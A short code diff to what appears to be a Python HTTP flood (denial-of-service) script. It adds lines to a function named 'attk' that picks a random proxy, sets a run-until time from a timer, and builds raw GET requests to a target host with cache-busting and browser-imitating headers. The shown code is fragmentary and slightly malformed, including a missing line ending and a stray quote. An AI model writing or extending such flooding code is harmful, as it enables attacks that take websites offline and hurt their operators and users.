@@ -4,4 +4,11 @@ def atk(url, timer, packet):
        
 def attk(url, timer):
     proxy = random.choice(proxies).strip().split(":")
+    samayam = time.time() + int(timer)
+    req = "GET / HTTP/1.1\r\nHost:  " + urlparse(url).netloc + "\r\n"
+    req += "cache-Control: no-cache \r\n"
+    req += "User-Agent: " #add user agents here
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
     
